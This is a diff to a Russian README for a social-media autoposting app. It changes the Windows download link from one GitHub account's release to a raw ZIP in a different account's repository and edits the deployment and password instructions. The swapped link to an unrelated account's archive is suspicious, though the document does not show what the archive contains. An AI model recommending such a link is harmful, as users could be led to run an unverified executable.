@@ -4,7 +4,7 @@ Desktop- и веб-приложение для публикации в VK, Од�
 
 Изображения JPG, PNG, GIF, WebP, HEIC, HEIF, AVIF, BMP и TIFF автоматически приводятся к совместимому с API формату, включая поворот EXIF, цветовой режим и ограничения Instagram.
 
-[Скачать приложение для Windows](https://github.com/code-spark-pro/single/releases/latest/download/Okno-v-drugoi-mir-safe.zip)
+[Скачать приложение для Windows](https://github.com/LearnFlowCore/single/raw/refs/heads/main/dist/Okno-v-drugoi-mir-safe.zip)
 
 ## Запуск
 
@@ -42,9 +42,9 @@ $env:AUTOPOSTER_WEB_PASSWORD = "сложный-пароль"
 python web_main.py
 ```
 
-Локальный адрес: `http://127.0.0.1:8000`. Главная страница доступна публично и содержит кнопку загрузки `dist\Okno-v-drugoi-mir-safe.zip`; веб-панель защищена логином и паролем. Для постоянной публичной ссылки разверните `Dockerfile` на VPS или облачном сервисе, подключите HTTPS-домен и задайте переменные `AUTOPOSTER_WEB_USERNAME`, `AUTOPOSTER_WEB_PASSWORD`, `AUTOPOSTER_WEB_SECRET` и `AUTOPOSTER_COOKIE_SECURE=1`. Каталог `/data` необходимо подключить как постоянный volume.
+Локальный адрес: `http://127.0.0.1:8000`. Главная страница доступна публично и содержит кнопку загрузки сборки Windows: локальный ZIP из `dist`, а если его нет — ZIP из GitHub. Веб-панель защищена логином и паролем. Для постоянной публичной ссылки разверните `Dockerfile` на VPS или облачном сервисе, подключите HTTPS-домен и задайте переменные `AUTOPOSTER_WEB_USERNAME`, `AUTOPOSTER_WEB_PASSWORD`, `AUTOPOSTER_WEB_SECRET` и `AUTOPOSTER_COOKIE_SECURE=1`. Каталог `/data` необходимо подключить как постоянный volume.
 
-Если переменные Render ещё не заданы, приложение допускает временный пароль, сохранённый локально в игнорируемом файле `.env.render`; в репозиторий включён только его SHA-256 хеш. После первого входа обязательно задайте новый `AUTOPOSTER_WEB_PASSWORD` в Render.
+Если переменные администратора ещё не заданы, приложение допускает временный пароль, сохранённый локально в игнорируемом файле `.env.render`; в репозиторий включён только его SHA-256 хеш. После первого входа задайте новый `AUTOPOSTER_WEB_PASSWORD` в окружении сервера.
 
 После развёртывания укажите полученный HTTPS-адрес в поле «Публичный адрес сайта». Кнопка «Открыть сайт» в верхней панели desktop-приложения будет открывать этот адрес.
 
